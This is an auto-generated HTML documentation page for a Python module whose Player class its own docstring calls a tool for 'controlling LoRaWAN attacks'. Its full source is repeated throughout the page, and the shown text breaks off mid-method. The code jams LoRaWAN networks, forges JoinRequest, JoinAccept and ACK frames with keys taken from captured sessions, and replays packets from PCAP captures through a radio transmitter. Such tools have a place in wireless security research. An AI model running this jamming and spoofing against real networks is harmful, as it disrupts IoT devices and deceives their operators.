<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.10.0" />
<title>src.player API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>src.player</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">import json

from src.command_handler import CommandHandler
from src.session_manager import SessionManager, SessionParams
from src.crypto_tools import CryptoTool
from src.analyzer import Analyzer


class Player(CommandHandler):
    &#34;&#34;&#34;Player class for controlling LoRaWAN attacks and analysis.

    This class provides functionalities to replay captured messages, jam the network, and spoof different LoRaWAN messages like JoinRequest, JoinAccept, and ACK messages. It utilizes the SessionManager to access session data and the CryptoTool for encryption and message integrity calculations.

    Inherits from:
        CommandHandler
    &#34;&#34;&#34;

    def __init__(self):
        &#34;&#34;&#34;Initializes the Player instance.

        Sets the path to the transmitter script, initializes instances of SessionManager, CryptoTool, and Analyzer classes.
        &#34;&#34;&#34;
        self.TRANSMITTER_PATH = &#39;./sniffers/lora_transmitter.py&#39;
        self.session_manager = SessionManager()
        self.crypto_tool = CryptoTool()
        self.analyzer = Analyzer()

    def __replay_message(self, message):
        &#34;&#34;&#34;Replays a LoRaWAN message using the configured transmitter script.

        Reads transmitter configuration from the config file, constructs the replay command with the provided message, and executes it.

        Args:
          message (str): The LoRaWAN message payload in hexadecimal format to be replayed.
        &#34;&#34;&#34;
        with open(&#39;./config/transmitter.config&#39;, &#39;r&#39;) as file:
            parameters = json.load(file)
        sample_rate = parameters[&#39;sample_rate&#39;]
        bandwidth = parameters[&#39;bandwidth&#39;]
        frequency = str(parameters[&#39;frequency&#39;])
        spreading_factor = str(parameters[&#39;spreading_factor&#39;])
        gain = str(parameters[&#39;gain_db&#39;])
        script_path = &#39;./sniffers/lora_transmitter.py&#39;

        print(&#39;Playing: &#39; + message)

        command = [&#39;python3&#39;, script_path, &#39;--frequency&#39;, frequency, &#39;--bandwidth&#39;, bandwidth, &#39;--samp-rate&#39;,
                   sample_rate, &#39;--spreading-factor&#39;, spreading_factor, &#39;--gain-db&#39;, gain, &#39;--message&#39;, message]
        self.execute_command(command)

    def jam(self):
        &#34;&#34;&#34;Jams the LoRaWAN network using a pre-defined message.

        Reads transmitter configuration from the config file, constructs the jamming command with a fixed message, and executes it.
        &#34;&#34;&#34;
        with open(&#39;./config/transmitter.config&#39;, &#39;r&#39;) as file:
            parameters = json.load(file)
        sample_rate = parameters[&#39;sample_rate&#39;]
        bandwidth = parameters[&#39;bandwidth&#39;]
        frequency = str(parameters[&#39;frequency&#39;])
        spreading_factor = str(parameters[&#39;spreading_factor&#39;])
        gain = str(parameters[&#39;gain_db&#39;])
        script_path = &#39;./sniffers/lora_transmitter.py&#39;

        print(&#39;Jamming&#39;)

        MESSAGE = &#39;0000002011111100000033333333000012234556&#39;

        command = [&#39;python3&#39;, script_path, &#39;--frequency&#39;, frequency, &#39;--bandwidth&#39;, bandwidth, &#39;--samp-rate&#39;,
                   sample_rate, &#39;--spreading-factor&#39;, spreading_factor, &#39;--gain-db&#39;, gain, &#39;--message&#39;, MESSAGE]
        self.execute_command(command)

    def spoof_ACK(self):
        &#34;&#34;&#34;Spoofs an unconfirmed data down LoRaWAN ACK message.

        Retrieves DevAddr from the session data and calculates the MIC using the NwkSKey. Constructs the ACK message payload and replays it using the __replay_message function.

        Raises:
            ValueError: If NwkSKey is missing in the session data.
        &#34;&#34;&#34;
        MHDR = &#39;60&#39;  # unconfirmed data down
        DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        FCTRL = &#39;20&#39;
        FCNT = &#39;FFF0&#39;  # placeholder, should be high enough to get accepted by the ED
        FRMPayload = MHDR + DEV_ADDR + FCTRL + FCNT
        if self.session_manager.get_session_value(SessionParams.NwkSKey) is None:
            print(&#39;Missing NwkSKey in session data&#39;)
            return
        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkSKey)),
                                           bytes.fromhex(FRMPayload))

        payload = &#39;183110&#39; + FRMPayload + MIC  # preamble

        self.__replay_message(payload)

    def spoof_JoinAccept(self):
        &#34;&#34;&#34;Spoofs a LoRaWAN JoinAccept message.

        Retrieves NwkKey from the session data and constructs the JoinAccept message payload based on the LoRaWAN specification. Encrypts the payload using the NwkKey and replays the encrypted message.

        Raises:
            ValueError: If NwkKey is missing in the session data.
        &#34;&#34;&#34;
        # join accept structure
        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
            print(&#39;Missing NwkKey&#39;)
            return

        PHY = &#39;000000&#39;
        MHDR = &#39;20&#39;
        JOIN_APP_NONCE = &#39;111111&#39;
        NET_ID = &#39;000000&#39;
        if self.session_manager.get_session_value(SessionParams.JoinAccept_NetID) is not None:
            NET_ID = self.session_manager.get_session_value(SessionParams.JoinAccept_NetID)
        DEV_ADDR = &#39;33333333&#39;
        if self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr) is not None:
            DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        OTHER = &#39;0000&#39;

        PAYLOAD = MHDR + JOIN_APP_NONCE + NET_ID + DEV_ADDR + OTHER

        PACKET = PHY + PAYLOAD + self.crypto_tool.compute_MIC(
            bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)), bytes.fromhex(PAYLOAD))

        ENC_PACKET = self.crypto_tool.encrypt_join_accept(PACKET, bytes.fromhex(
            self.session_manager.get_session_value(SessionParams.NwkKey)))

        self.__replay_message(ENC_PACKET)
        # Join-accept   MHDR | JoinNonce | NetID | DevAddr | DLSettings | RxDelay | CFList

    def spoof_JoinRequest(self):
        &#34;&#34;&#34;Spoofs a LoRaWAN JoinRequest message.

        Retrieves NwkKey from the session data and constructs the JoinRequest message payload based on the LoRaWAN specification. Computes the MIC using the NwkKey and replays the message.

        Raises:
            ValueError: If NwkKey is missing in the session data.
        &#34;&#34;&#34;
        # join accept structure
        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
            print(&#39;Missing NwkKey&#39;)
            return

        PHY = &#39;173180&#39;
        MHDR = &#39;00&#39;
        JOIN_APP_EUI = &#39;0000000000000000&#39;
        if self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI) is not None:
            JOIN_APP_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI)
        DEV_EUI = &#39;3333333333333333&#39;
        if self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI) is not None:
            DEV_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI)
        DEV_NONCE = &#39;1237&#39;

        PAYLOAD = MHDR + JOIN_APP_EUI + DEV_EUI + DEV_NONCE
        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)),
                                           bytes.fromhex(PAYLOAD))

        PACKET = PHY + PAYLOAD + MIC

        self.__replay_message(PACKET)

    def replay_sequence_from_pcap(self, script_path):
        &#34;&#34;&#34;Replays a sequence of LoRaWAN messages captured in a PCAP file.

        Utilizes the Analyzer class to extract the packet sequence from the provided PCAP file. Iterates through the extracted payloads and replays each message using the __replay_message function.

        Args:
            script_path (str): The path to the PCAP file containing the LoRaWAN message sequence.
        &#34;&#34;&#34;
        # TODO add support for multiple payloads
        payloads = self.analyzer.get_packet_sequence_from_pcap(script_path)
        for payload in payloads:
            self.__replay_message(payload)

    def configure_transmitter(self):
        &#34;&#34;&#34;Opens the transmitter configuration file for editing using the gedit text editor.

        If the configuration file doesn&#39;t exist, it creates an empty file.

        Raises:
            FileNotFoundError: If the default text editor cannot be found.
        &#34;&#34;&#34;
        config_path = &#39;./config/transmitter.config&#39;
        command = [&#39;gedit&#39;, config_path]
        self.execute_command(command)

    def configure_jammer(self):
        &#34;&#34;&#34;Opens the jammer configuration file for editing using the gedit text editor.

        If the configuration file doesn&#39;t exist, it creates an empty file.

        Raises:
            FileNotFoundError: If the default text editor cannot be found.
        &#34;&#34;&#34;
        config_path = &#39;./config/jammer.config&#39;
        command = [&#39;gedit&#39;, config_path]
        self.execute_command(command)


if __name__ == &#34;__main__&#34;:
    p = Player()
    p.spoof_JoinRequest()</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="src.player.Player"><code class="flex name class">
<span>class <span class="ident">Player</span></span>
</code></dt>
<dd>
<div class="desc"><p>Player class for controlling LoRaWAN attacks and analysis.</p>
<p>This class provides functionalities to replay captured messages, jam the network, and spoof different LoRaWAN messages like JoinRequest, JoinAccept, and ACK messages. It utilizes the SessionManager to access session data and the CryptoTool for encryption and message integrity calculations.</p>
<p>Inherits from:
CommandHandler</p>
<p>Initializes the Player instance.</p>
<p>Sets the path to the transmitter script, initializes instances of SessionManager, CryptoTool, and Analyzer classes.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class Player(CommandHandler):
    &#34;&#34;&#34;Player class for controlling LoRaWAN attacks and analysis.

    This class provides functionalities to replay captured messages, jam the network, and spoof different LoRaWAN messages like JoinRequest, JoinAccept, and ACK messages. It utilizes the SessionManager to access session data and the CryptoTool for encryption and message integrity calculations.

    Inherits from:
        CommandHandler
    &#34;&#34;&#34;

    def __init__(self):
        &#34;&#34;&#34;Initializes the Player instance.

        Sets the path to the transmitter script, initializes instances of SessionManager, CryptoTool, and Analyzer classes.
        &#34;&#34;&#34;
        self.TRANSMITTER_PATH = &#39;./sniffers/lora_transmitter.py&#39;
        self.session_manager = SessionManager()
        self.crypto_tool = CryptoTool()
        self.analyzer = Analyzer()

    def __replay_message(self, message):
        &#34;&#34;&#34;Replays a LoRaWAN message using the configured transmitter script.

        Reads transmitter configuration from the config file, constructs the replay command with the provided message, and executes it.

        Args:
          message (str): The LoRaWAN message payload in hexadecimal format to be replayed.
        &#34;&#34;&#34;
        with open(&#39;./config/transmitter.config&#39;, &#39;r&#39;) as file:
            parameters = json.load(file)
        sample_rate = parameters[&#39;sample_rate&#39;]
        bandwidth = parameters[&#39;bandwidth&#39;]
        frequency = str(parameters[&#39;frequency&#39;])
        spreading_factor = str(parameters[&#39;spreading_factor&#39;])
        gain = str(parameters[&#39;gain_db&#39;])
        script_path = &#39;./sniffers/lora_transmitter.py&#39;

        print(&#39;Playing: &#39; + message)

        command = [&#39;python3&#39;, script_path, &#39;--frequency&#39;, frequency, &#39;--bandwidth&#39;, bandwidth, &#39;--samp-rate&#39;,
                   sample_rate, &#39;--spreading-factor&#39;, spreading_factor, &#39;--gain-db&#39;, gain, &#39;--message&#39;, message]
        self.execute_command(command)

    def jam(self):
        &#34;&#34;&#34;Jams the LoRaWAN network using a pre-defined message.

        Reads transmitter configuration from the config file, constructs the jamming command with a fixed message, and executes it.
        &#34;&#34;&#34;
        with open(&#39;./config/transmitter.config&#39;, &#39;r&#39;) as file:
            parameters = json.load(file)
        sample_rate = parameters[&#39;sample_rate&#39;]
        bandwidth = parameters[&#39;bandwidth&#39;]
        frequency = str(parameters[&#39;frequency&#39;])
        spreading_factor = str(parameters[&#39;spreading_factor&#39;])
        gain = str(parameters[&#39;gain_db&#39;])
        script_path = &#39;./sniffers/lora_transmitter.py&#39;

        print(&#39;Jamming&#39;)

        MESSAGE = &#39;0000002011111100000033333333000012234556&#39;

        command = [&#39;python3&#39;, script_path, &#39;--frequency&#39;, frequency, &#39;--bandwidth&#39;, bandwidth, &#39;--samp-rate&#39;,
                   sample_rate, &#39;--spreading-factor&#39;, spreading_factor, &#39;--gain-db&#39;, gain, &#39;--message&#39;, MESSAGE]
        self.execute_command(command)

    def spoof_ACK(self):
        &#34;&#34;&#34;Spoofs an unconfirmed data down LoRaWAN ACK message.

        Retrieves DevAddr from the session data and calculates the MIC using the NwkSKey. Constructs the ACK message payload and replays it using the __replay_message function.

        Raises:
            ValueError: If NwkSKey is missing in the session data.
        &#34;&#34;&#34;
        MHDR = &#39;60&#39;  # unconfirmed data down
        DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        FCTRL = &#39;20&#39;
        FCNT = &#39;FFF0&#39;  # placeholder, should be high enough to get accepted by the ED
        FRMPayload = MHDR + DEV_ADDR + FCTRL + FCNT
        if self.session_manager.get_session_value(SessionParams.NwkSKey) is None:
            print(&#39;Missing NwkSKey in session data&#39;)
            return
        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkSKey)),
                                           bytes.fromhex(FRMPayload))

        payload = &#39;183110&#39; + FRMPayload + MIC  # preamble

        self.__replay_message(payload)

    def spoof_JoinAccept(self):
        &#34;&#34;&#34;Spoofs a LoRaWAN JoinAccept message.

        Retrieves NwkKey from the session data and constructs the JoinAccept message payload based on the LoRaWAN specification. Encrypts the payload using the NwkKey and replays the encrypted message.

        Raises:
            ValueError: If NwkKey is missing in the session data.
        &#34;&#34;&#34;
        # join accept structure
        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
            print(&#39;Missing NwkKey&#39;)
            return

        PHY = &#39;000000&#39;
        MHDR = &#39;20&#39;
        JOIN_APP_NONCE = &#39;111111&#39;
        NET_ID = &#39;000000&#39;
        if self.session_manager.get_session_value(SessionParams.JoinAccept_NetID) is not None:
            NET_ID = self.session_manager.get_session_value(SessionParams.JoinAccept_NetID)
        DEV_ADDR = &#39;33333333&#39;
        if self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr) is not None:
            DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
        OTHER = &#39;0000&#39;

        PAYLOAD = MHDR + JOIN_APP_NONCE + NET_ID + DEV_ADDR + OTHER

        PACKET = PHY + PAYLOAD + self.crypto_tool.compute_MIC(
            bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)), bytes.fromhex(PAYLOAD))

        ENC_PACKET = self.crypto_tool.encrypt_join_accept(PACKET, bytes.fromhex(
            self.session_manager.get_session_value(SessionParams.NwkKey)))

        self.__replay_message(ENC_PACKET)
        # Join-accept   MHDR | JoinNonce | NetID | DevAddr | DLSettings | RxDelay | CFList

    def spoof_JoinRequest(self):
        &#34;&#34;&#34;Spoofs a LoRaWAN JoinRequest message.

        Retrieves NwkKey from the session data and constructs the JoinRequest message payload based on the LoRaWAN specification. Computes the MIC using the NwkKey and replays the message.

        Raises:
            ValueError: If NwkKey is missing in the session data.
        &#34;&#34;&#34;
        # join accept structure
        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
            print(&#39;Missing NwkKey&#39;)
            return

        PHY = &#39;173180&#39;
        MHDR = &#39;00&#39;
        JOIN_APP_EUI = &#39;0000000000000000&#39;
        if self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI) is not None:
            JOIN_APP_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI)
        DEV_EUI = &#39;3333333333333333&#39;
        if self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI) is not None:
            DEV_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI)
        DEV_NONCE = &#39;1237&#39;

        PAYLOAD = MHDR + JOIN_APP_EUI + DEV_EUI + DEV_NONCE
        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)),
                                           bytes.fromhex(PAYLOAD))

        PACKET = PHY + PAYLOAD + MIC

        self.__replay_message(PACKET)

    def replay_sequence_from_pcap(self, script_path):
        &#34;&#34;&#34;Replays a sequence of LoRaWAN messages captured in a PCAP file.

        Utilizes the Analyzer class to extract the packet sequence from the provided PCAP file. Iterates through the extracted payloads and replays each message using the __replay_message function.

        Args:
            script_path (str): The path to the PCAP file containing the LoRaWAN message sequence.
        &#34;&#34;&#34;
        # TODO add support for multiple payloads
        payloads = self.analyzer.get_packet_sequence_from_pcap(script_path)
        for payload in payloads:
            self.__replay_message(payload)

    def configure_transmitter(self):
        &#34;&#34;&#34;Opens the transmitter configuration file for editing using the gedit text editor.

        If the configuration file doesn&#39;t exist, it creates an empty file.

        Raises:
            FileNotFoundError: If the default text editor cannot be found.
        &#34;&#34;&#34;
        config_path = &#39;./config/transmitter.config&#39;
        command = [&#39;gedit&#39;, config_path]
        self.execute_command(command)

    def configure_jammer(self):
        &#34;&#34;&#34;Opens the jammer configuration file for editing using the gedit text editor.

        If the configuration file doesn&#39;t exist, it creates an empty file.

        Raises:
            FileNotFoundError: If the default text editor cannot be found.
        &#34;&#34;&#34;
        config_path = &#39;./config/jammer.config&#39;
        command = [&#39;gedit&#39;, config_path]
        self.execute_command(command)</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="src.command_handler.CommandHandler" href="command_handler.html#src.command_handler.CommandHandler">CommandHandler</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="src.player.Player.configure_jammer"><code class="name flex">
<span>def <span class="ident">configure_jammer</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Opens the jammer configuration file for editing using the gedit text editor.</p>
<p>If the configuration file doesn't exist, it creates an empty file.</p>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>FileNotFoundError</code></dt>
<dd>If the default text editor cannot be found.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def configure_jammer(self):
    &#34;&#34;&#34;Opens the jammer configuration file for editing using the gedit text editor.

    If the configuration file doesn&#39;t exist, it creates an empty file.

    Raises:
        FileNotFoundError: If the default text editor cannot be found.
    &#34;&#34;&#34;
    config_path = &#39;./config/jammer.config&#39;
    command = [&#39;gedit&#39;, config_path]
    self.execute_command(command)</code></pre>
</details>
</dd>
<dt id="src.player.Player.configure_transmitter"><code class="name flex">
<span>def <span class="ident">configure_transmitter</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Opens the transmitter configuration file for editing using the gedit text editor.</p>
<p>If the configuration file doesn't exist, it creates an empty file.</p>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>FileNotFoundError</code></dt>
<dd>If the default text editor cannot be found.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def configure_transmitter(self):
    &#34;&#34;&#34;Opens the transmitter configuration file for editing using the gedit text editor.

    If the configuration file doesn&#39;t exist, it creates an empty file.

    Raises:
        FileNotFoundError: If the default text editor cannot be found.
    &#34;&#34;&#34;
    config_path = &#39;./config/transmitter.config&#39;
    command = [&#39;gedit&#39;, config_path]
    self.execute_command(command)</code></pre>
</details>
</dd>
<dt id="src.player.Player.jam"><code class="name flex">
<span>def <span class="ident">jam</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Jams the LoRaWAN network using a pre-defined message.</p>
<p>Reads transmitter configuration from the config file, constructs the jamming command with a fixed message, and executes it.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def jam(self):
    &#34;&#34;&#34;Jams the LoRaWAN network using a pre-defined message.

    Reads transmitter configuration from the config file, constructs the jamming command with a fixed message, and executes it.
    &#34;&#34;&#34;
    with open(&#39;./config/transmitter.config&#39;, &#39;r&#39;) as file:
        parameters = json.load(file)
    sample_rate = parameters[&#39;sample_rate&#39;]
    bandwidth = parameters[&#39;bandwidth&#39;]
    frequency = str(parameters[&#39;frequency&#39;])
    spreading_factor = str(parameters[&#39;spreading_factor&#39;])
    gain = str(parameters[&#39;gain_db&#39;])
    script_path = &#39;./sniffers/lora_transmitter.py&#39;

    print(&#39;Jamming&#39;)

    MESSAGE = &#39;0000002011111100000033333333000012234556&#39;

    command = [&#39;python3&#39;, script_path, &#39;--frequency&#39;, frequency, &#39;--bandwidth&#39;, bandwidth, &#39;--samp-rate&#39;,
               sample_rate, &#39;--spreading-factor&#39;, spreading_factor, &#39;--gain-db&#39;, gain, &#39;--message&#39;, MESSAGE]
    self.execute_command(command)</code></pre>
</details>
</dd>
<dt id="src.player.Player.replay_sequence_from_pcap"><code class="name flex">
<span>def <span class="ident">replay_sequence_from_pcap</span></span>(<span>self, script_path)</span>
</code></dt>
<dd>
<div class="desc"><p>Replays a sequence of LoRaWAN messages captured in a PCAP file.</p>
<p>Utilizes the Analyzer class to extract the packet sequence from the provided PCAP file. Iterates through the extracted payloads and replays each message using the __replay_message function.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>script_path</code></strong> :&ensp;<code>str</code></dt>
<dd>The path to the PCAP file containing the LoRaWAN message sequence.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def replay_sequence_from_pcap(self, script_path):
    &#34;&#34;&#34;Replays a sequence of LoRaWAN messages captured in a PCAP file.

    Utilizes the Analyzer class to extract the packet sequence from the provided PCAP file. Iterates through the extracted payloads and replays each message using the __replay_message function.

    Args:
        script_path (str): The path to the PCAP file containing the LoRaWAN message sequence.
    &#34;&#34;&#34;
    # TODO add support for multiple payloads
    payloads = self.analyzer.get_packet_sequence_from_pcap(script_path)
    for payload in payloads:
        self.__replay_message(payload)</code></pre>
</details>
</dd>
<dt id="src.player.Player.spoof_ACK"><code class="name flex">
<span>def <span class="ident">spoof_ACK</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Spoofs an unconfirmed data down LoRaWAN ACK message.</p>
<p>Retrieves DevAddr from the session data and calculates the MIC using the NwkSKey. Constructs the ACK message payload and replays it using the __replay_message function.</p>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>ValueError</code></dt>
<dd>If NwkSKey is missing in the session data.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def spoof_ACK(self):
    &#34;&#34;&#34;Spoofs an unconfirmed data down LoRaWAN ACK message.

    Retrieves DevAddr from the session data and calculates the MIC using the NwkSKey. Constructs the ACK message payload and replays it using the __replay_message function.

    Raises:
        ValueError: If NwkSKey is missing in the session data.
    &#34;&#34;&#34;
    MHDR = &#39;60&#39;  # unconfirmed data down
    DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
    FCTRL = &#39;20&#39;
    FCNT = &#39;FFF0&#39;  # placeholder, should be high enough to get accepted by the ED
    FRMPayload = MHDR + DEV_ADDR + FCTRL + FCNT
    if self.session_manager.get_session_value(SessionParams.NwkSKey) is None:
        print(&#39;Missing NwkSKey in session data&#39;)
        return
    MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkSKey)),
                                       bytes.fromhex(FRMPayload))

    payload = &#39;183110&#39; + FRMPayload + MIC  # preamble

    self.__replay_message(payload)</code></pre>
</details>
</dd>
<dt id="src.player.Player.spoof_JoinAccept"><code class="name flex">
<span>def <span class="ident">spoof_JoinAccept</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Spoofs a LoRaWAN JoinAccept message.</p>
<p>Retrieves NwkKey from the session data and constructs the JoinAccept message payload based on the LoRaWAN specification. Encrypts the payload using the NwkKey and replays the encrypted message.</p>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>ValueError</code></dt>
<dd>If NwkKey is missing in the session data.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def spoof_JoinAccept(self):
    &#34;&#34;&#34;Spoofs a LoRaWAN JoinAccept message.

    Retrieves NwkKey from the session data and constructs the JoinAccept message payload based on the LoRaWAN specification. Encrypts the payload using the NwkKey and replays the encrypted message.

    Raises:
        ValueError: If NwkKey is missing in the session data.
    &#34;&#34;&#34;
    # join accept structure
    # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
    if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
        print(&#39;Missing NwkKey&#39;)
        return

    PHY = &#39;000000&#39;
    MHDR = &#39;20&#39;
    JOIN_APP_NONCE = &#39;111111&#39;
    NET_ID = &#39;000000&#39;
    if self.session_manager.get_session_value(SessionParams.JoinAccept_NetID) is not None:
        NET_ID = self.session_manager.get_session_value(SessionParams.JoinAccept_NetID)
    DEV_ADDR = &#39;33333333&#39;
    if self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr) is not None:
        DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
    OTHER = &#39;0000&#39;

